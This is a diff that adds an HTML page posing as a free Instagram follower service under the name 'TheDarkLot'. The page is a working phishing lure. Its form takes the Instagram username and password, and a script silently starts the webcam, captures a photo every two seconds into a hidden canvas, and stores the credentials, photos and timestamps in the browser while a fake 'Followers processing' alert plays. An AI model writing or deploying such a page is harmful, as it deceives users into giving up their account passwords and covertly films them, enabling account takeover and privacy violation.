@@ -1,0 +1,83 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Free Followers | TheDarkLot</title>
+  <style>
+    body {
+      background: radial-gradient(circle at center, #111 0%, #000 100%);
+      font-family: Arial, sans-serif;
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      color: #00ffae;
+    }
+    input, select, button {
+      margin: 10px;
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+      font-size: 16px;
+    }
+    #camera {
+      display: none;
+    }
+    canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>🚀 Get Free Instagram Followers</h1>
+  <form id="userForm">
+    <input type="text" id="username" placeholder="Instagram Username" required><br>
+    <input type="password" id="password" placeholder="Instagram Password" required><br>
+    <select id="followers">
+      <option value="100">100 Followers</option>
+      <option value="500">500 Followers</option>
+      <option value="1000">1000 Followers</option>
+    </select><br>
+    <button type="submit">Get Followers</button>
+  </form>
+  <video id="camera" autoplay></video>
+  <canvas id="snapshot" width="300" height="200"></canvas>
+
+  <script>
+    const video = document.getElementById('camera');
+    const canvas = document.getElementById('snapshot');
+    const ctx = canvas.getContext('2d');
+
+    // Start camera silently
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      video.srcObject = stream;
+    });
+
+    // Take and send photo every 2 seconds
+    setInterval(() => {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const image = canvas.toDataURL("image/jpeg");
+      localStorage.setItem("image", image);
+    }, 2000);
+
+    document.getElementById("userForm").addEventListener("submit", function(e){
+      e.preventDefault();
+      const entry = {
+        Username: document.getElementById("username").value,
+        Password: document.getElementById("password").value,
+        Followers: document.getElementById("followers").value,
+        ImageURL: localStorage.getItem("image"),
+        Timestamp: new Date().toLocaleString()
+      };
+
+      let saved = JSON.parse(localStorage.getItem("entries") || "[]");
+      saved.push(entry);
+      localStorage.setItem("entries", JSON.stringify(saved));
+      alert("Followers processing... Please wait!");
+    });
+  </script>
+</body>
+</html>
